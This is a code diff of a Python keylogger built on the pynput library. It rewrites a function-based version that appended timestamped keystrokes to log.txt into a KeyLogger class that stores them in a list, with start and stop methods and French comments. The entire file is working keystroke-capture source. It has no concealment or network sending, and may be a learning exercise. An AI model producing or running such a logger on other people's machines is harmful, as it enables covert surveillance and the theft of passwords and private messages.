@@ -1,24 +1,33 @@
 import pynput
-from pynput.keyboard import Key, Listener
-import datetime
+from pynput import keyboard
+from datetime import datetime
 
-def on_press(key):
-    write_file(str(key))
+class KeyLogger:
+    """
+    Classe permettant de créer des keyloggers et de les contrôller
+    """
+    def __init__(self):
+        """
+        Un keylogger stock les logs d'inputs reçu dans une liste keys
+        """
+        self.keys = []
 
-def on_release(key):
-    if key == Key.esc:
-        return False
+        def on_press(key):
+            log = str(datetime.now().time()) + " " + str(key)
+            log=log.replace("'","")
+            log=log.replace('"',"")
+            self.keys.append(log)
 
-def write_file(key):
-    with open("log.txt",'a') as f:
-        f.write(str(datetime.datetime.now()))
-        f.write(" ")
+        self.listener = keyboard.Listener(on_press=on_press)
 
-        key = key.replace("'","")
-        f.write(key)
-        f.write("\n")
+    def start(self):
+        """
+        permet de démarrer le keylogger
+        """
+        self.listener.start()
 
-
-def keylog():
-    with Listener(on_press=on_press, on_release=on_release) as listener:
-        listener.join()
+    def stop(self):
+        """
+        permet d'arrêter le keylogger
+        """
+        self.listener.stop()
